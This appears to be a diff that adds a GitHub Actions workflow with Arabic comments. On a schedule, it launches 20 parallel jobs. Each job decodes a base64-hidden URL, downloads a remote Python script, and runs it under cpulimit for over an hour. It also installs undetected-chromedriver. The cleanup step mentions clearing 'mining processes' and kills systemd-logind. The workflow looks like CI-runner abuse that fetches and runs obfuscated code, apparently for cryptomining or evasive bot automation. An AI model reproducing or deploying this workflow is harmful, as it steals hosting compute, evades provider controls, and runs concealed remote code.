@@ -1,0 +1,119 @@
+name: Linux Distributed Task Battalion
+
+on:
+  schedule:
+    # تشغيل تلقائي في الأوقات: 02:00، 10:00، 18:00 (توقيت UTC)
+    - cron: '0 2,10,18 * * *'
+
+concurrency:
+  group: task-battalion-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # حارس الزمن الشامل: يُنهي الـ workflow بالكامل بعد 60 دقيقة
+  # =================================================================
+  chrono-guardian:
+    name: "Chrono Guardian"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+    steps:
+      - name: Arm Global Time Cutoff
+        run: |
+          echo "[GUARDIAN] Chrono guardian armed. Every task will be wiped at the 60-minute boundary."
+          echo "[GUARDIAN] Tracking execution run: ${{ github.run_id }}"
+          
+          # الانتظار حتى بلوغ حد الساعة الواحدة (3600 ثانية)
+          sleep 3600
+          
+          echo "[GUARDIAN] 60-minute boundary crossed! Releasing termination order..."
+          
+          # إطلاق أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[GUARDIAN] Termination order dispatched."
+
+  # =================================================================
+  # المهمة الرئيسية: تحضير وإطلاق وحدات المهام
+  # =================================================================
+  mobilize-battalion:
+    name: "BattalionUnit-${{ matrix.unit_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_code: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈١〉 إرساء طبقة الأساس
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Lay Base Layer
+        run: |
+          echo "[LAYER] Laying base layer for BattalionUnit-${{ matrix.unit_code }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٢〉 تنزيل ملف المهمة الرئيسي
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Download Task Payload
+        run: |
+          echo "[DOWNLOAD] Downloading app_task.py from cloud endpoint..."
+          CLOUD_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$CLOUD_ENDPOINT" -o app_task.py
+          echo "[DOWNLOAD] Payload saved to workspace."
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٣〉 تحميل حزم بايثون المطلوبة
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Fetch Python Packages
+        run: |
+          echo "[PACKAGES] Fetching required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٤〉 تشغيل المهمة مع ضابط الوقت
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Execute Under Time Marshal
+        run: |
+          echo ">> Mobilizing BattalionUnit-${{ matrix.unit_code }}..."
+          
+          # إطلاق السكربت في الخلفية
+          python3 app_task.py &
+          BATTALION_PID=$!
+          
+          echo ">> Time marshal on duty. Cut-off at 74 minutes."
+          
+          # الانتظار حتى نهاية المهلة المسموحة
+          sleep 4440
+          
+          # فحص العملية وإنهاؤها إذا استمرت
+          if kill -0 $BATTALION_PID 2>/dev/null; then
+            echo ">> Cut-off reached! Halting task..."
+            kill -9 $BATTALION_PID
+            echo ">> Task halted by time marshal."
+          else
+            echo ">> Task finished before cut-off."
+          fi
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # 〈٥〉 التنظيف وإخراج الوحدة من الخدمة
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Cleanup and Demobilize
+        run: |
+          echo "[DEMOB] BattalionUnit-${{ matrix.unit_code }} demobilizing."
+          echo "[DEMOB] Clearing residual cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[DEMOB] BattalionUnit-${{ matrix.unit_code }} demobilized cleanly."
